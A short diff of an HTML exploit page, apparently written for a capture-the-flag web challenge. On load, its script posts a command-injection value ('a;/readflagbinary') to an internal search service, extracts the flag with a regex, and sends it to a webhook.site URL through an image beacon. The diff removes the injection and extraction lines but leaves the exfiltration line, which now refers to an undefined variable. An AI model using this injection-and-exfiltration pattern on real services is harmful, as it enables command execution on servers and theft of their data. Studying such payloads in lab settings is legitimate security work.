@@ -2,16 +2,6 @@
 <html><head></head><body onload="doIt()">
 <script>
 function doIt() {
-  fetch('http://web:5000/search', {
-    method: 'POST',
-    headers: {'Content-Type': 'application/x-www-form-urlencoded'},
-    body: 'search=a;/readflagbinary'
-  })
-  .then(r => r.text())
-  .then(html => {
-    // Extract flag from page
-    let match = html.match(/FLAG[^<]+/);
     new Image().src = 'https://webhook.site/227b0e75-41a9-46f7-b5f1-9bc2d27c327d?flag=' + encodeURIComponent(match[0]);
-  });
 }
 </script></body></html>
